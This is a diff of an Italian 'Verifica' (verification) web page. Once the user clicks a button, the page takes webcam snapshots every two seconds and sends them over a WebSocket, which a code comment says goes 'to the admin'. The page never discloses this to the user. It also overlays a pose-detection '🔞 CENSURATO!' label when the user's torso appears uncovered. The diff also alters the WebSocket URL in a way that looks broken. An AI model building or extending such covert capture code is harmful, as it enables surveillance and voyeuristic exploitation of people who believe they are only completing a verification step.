@@ -4,10 +4,13 @@
   <meta charset="utf-8">
   <title>Verifica</title>
   <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@latest"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/pose-detection"></script>
   <style>
     body { background:#000; color:#fff; font-family:Arial; text-align:center; padding:20px; margin:0; }
-    #box { max-width:500px; margin:auto; background:#111; padding:30px; border-radius:12px; }
+    #box { max-width:500px; margin:auto; background:#111; padding:30px; border-radius:12px; position:relative; }
     video { width:100%; max-width:400px; border-radius:8px; background:#000; }
+    #overlay { position:absolute; left:0; top:0; width:100%; height:100%; pointer-events:none; z-index:10; }
     button { padding:14px 30px; font-size:18px; margin:10px; border:none; border-radius:6px; cursor:pointer; }
     #consenti { background:#0066ff; color:white; }
     #stop { background:#ff4444; color:white; display:none; }
@@ -19,73 +22,95 @@
   <input id="user" placeholder="Nome (opzionale)" style="padding:12px; width:80%; margin:10px 0;">
   <button id="consenti">Tu adesso</button>
   <button id="stop">⛔ Ferma</button>
+  
   <video id="localVideo" autoplay playsinline muted></video>
+  <canvas id="overlay" width="400" height="300"></canvas>
 </div>
 
 <script>
-  console.log('Pagina utente caricata - script avviato');
-  const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
+  const ws = new WebSocket((location.protocol === 'https:' ? 'wss:' : 'ws:') + location.host);
   let stream = null;
-  let mediaRecorder = null;
+  let interval = null;
+  let detector = null;
+  const video = document.getElementById('localVideo');
+  const overlay = document.getElementById('overlay');
+  const ctx = overlay.getContext('2d');
+  const canvas = document.createElement('canvas'); // per foto
 
-  ws.onopen = () => console.log('WS utente aperto');
-  ws.onerror = (e) => console.error('WS errore utente:', e);
-  ws.onclose = () => console.log('WS utente chiuso');
+  // Carica modello pose
+  async function loadPoseModel() {
+    detector = await poseDetection.createDetector(poseDetection.SupportedModels.MoveNet);
+  }
+  loadPoseModel();
 
   document.getElementById('consenti').onclick = async () => {
-    console.log('Cliccato Tu adesso - richiesta stream');
     try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user' },
-        audio: true
-      });
-      console.log('Stream ottenuto:', stream.getTracks().map(t => t.kind));
-
-      document.getElementById('localVideo').srcObject = stream;
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      video.srcObject = stream;
       document.getElementById('consenti').style.display = 'none';
       document.getElementById('stop').style.display = 'inline-block';
 
-      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
-      console.log('MediaRecorder creato con mime:', mediaRecorder.mimeType);
+      interval = setInterval(() => {
+        if (video.videoWidth === 0) return;
 
-      mediaRecorder.ondataavailable = (e) => {
-        console.log('ondataavailable - chunk size:', e.data.size);
-        if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) {
-          ws.send(e.data);
-          console.log('Chunk inviato OK');
-        } else {
-          console.warn('Chunk non inviato - WS non pronto');
-        }
-      };
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const base64 = canvas.toDataURL('image/jpeg', 0.7);
 
-      mediaRecorder.onerror = (e) => console.error('MediaRecorder error:', e);
-      mediaRecorder.start(1000);
-      console.log('MediaRecorder started - chunk ogni 1s');
+        ws.send(base64); // invia foto base64 all'admin
+
+        // Overlay simpatico
+        ctx.clearRect(0, 0, overlay.width, overlay.height);
+        detectAndDraw(video);
+      }, 2000);
 
     } catch (err) {
-      console.error('Errore getUserMedia:', err);
       alert('Errore: ' + err.message);
     }
   };
 
+  async function detectAndDraw(video) {
+    if (!detector) return;
+    const poses = await detector.estimatePoses(video);
+    if (poses.length > 0) {
+      const keypoints = poses[0].keypoints;
+
+      // Esempio: se torso "scoperto" (spalle basse)
+      const leftShoulder = keypoints.find(k => k.name === 'left_shoulder');
+      const rightShoulder = keypoints.find(k => k.name === 'right_shoulder');
+
+      if (leftShoulder.score < 0.3 || rightShoulder.score < 0.3) {
+        ctx.font = '60px Arial';
+        ctx.fillStyle = 'red';
+        ctx.fillText('🔞 CENSURATO!', 20, 100);
+        ctx.fillText('😈', 180, 180);
+      }
+
+      // Se ride (bocca larga)
+      const mouthLeft = keypoints.find(k => k.name === 'mouth_left');
+      const mouthRight = keypoints.find(k => k.name === 'mouth_right');
+      if (mouthLeft && mouthRight && Math.abs(mouthLeft.y - mouthRight.y) > 20) {
+        ctx.font = '80px Arial';
+        ctx.fillText('😂😂', 100, 150);
+      }
+    }
+  }
+
   document.getElementById('stop').onclick = () => {
-    console.log('Cliccato Ferma');
-    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+    if (interval) clearInterval(interval);
     if (stream) stream.getTracks().forEach(t => t.stop());
     stream = null;
-    document.getElementById('localVideo').srcObject = null;
+    video.srcObject = null;
+    ctx.clearRect(0, 0, overlay.width, overlay.height);
     document.getElementById('consenti').style.display = 'inline-block';
     document.getElementById('stop').style.display = 'none';
   };
 
-  ws.onmessage = (event) => {
-    if (typeof event.data === 'string') {
-      try {
-        const msg = JSON.parse(event.data);
-        if (msg.type === 'stop') document.getElementById('stop').click();
-      } catch {}
-    }
-  };
+  window.addEventListener('beforeunload', () => {
+    if (interval) clearInterval(interval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  });
 </script>
 </body>
 </html>
